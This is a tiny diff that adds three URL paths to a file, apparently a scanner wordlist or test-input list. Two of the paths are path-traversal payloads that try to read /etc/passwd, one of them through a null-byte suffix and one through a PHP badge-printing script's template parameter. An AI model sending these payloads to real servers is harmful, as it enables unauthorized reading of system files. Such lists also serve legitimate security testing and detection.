@@ -1,0 +1,3 @@
+/?c=../../../../../../etc/passwd%00
+/badging/badge_print_v0.php?tpl=../../../../../etc/passwd
+/test.txt
